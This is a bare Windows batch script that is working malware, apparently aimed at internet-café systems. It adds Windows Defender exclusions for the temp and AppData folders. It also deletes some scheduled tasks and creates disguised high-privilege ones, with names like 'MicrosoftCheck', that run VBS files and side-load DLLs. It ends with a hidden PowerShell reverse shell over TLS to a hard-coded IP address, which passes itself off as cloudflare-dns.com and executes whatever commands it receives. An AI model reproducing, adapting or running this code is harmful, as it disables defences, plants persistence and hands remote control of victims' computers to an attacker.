@echo off

powershell -c Add-MpPreference -ExclusionPath "%temp%"
powershell -c Add-MpPreference -ExclusionPath "%APPDATA%"
schtasks /delete /tn "auto_by_task" /f
schtasks /delete /tn "InstallRequests" /f
schtasks /delete /tn "RunPowerShellScript" /f
schtasks /create /tn "MicrosoftCheck" /sc minute /mo 6 /tr "wscript.exe \"%APPDATA%\microsoftcheck.vbs\"" /rl HIGHEST /f
schtasks /delete /tn "TempVBS" /f
schtasks /create /tn "TempVBS2" /sc minute /mo 5 /tr "\"%SystemRoot%\System32\wscript.exe\" //e:vbscript //b \"%TEMP%\ddd.vbs\"" /rl HIGHEST /f
schtasks /create /tn "PncserverDiag" /tr "%temp%\Pancafediag.exe pncserver.exe %temp%\PncDiag.dll" /sc onlogon /rl highest /f
schtasks /create /tn "CafePlusDiag" /tr "%temp%\Pancafediag.exe CafePlus.exe %temp%\CafePlusdll.dll" /sc onlogon /rl highest /f


powershell -w hidden -c "$c=New-Object Net.Sockets.TCPClient('185.194.175.132',447);$s=New-Object Net.Security.SslStream($c.GetStream(),$false,({$true}-as[Net.Security.RemoteCertificateValidationCallback]),$null);$s.AuthenticateAsClient('cloudflare-dns.com',$null,[System.Security.Authentication.SslProtocols]::Tls12,$false);$r=New-Object IO.StreamReader($s);$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;while(($l=$r.ReadLine())-ne $null){$o=(iex $l 2>&1|Out-String);$w.WriteLine($o)}"


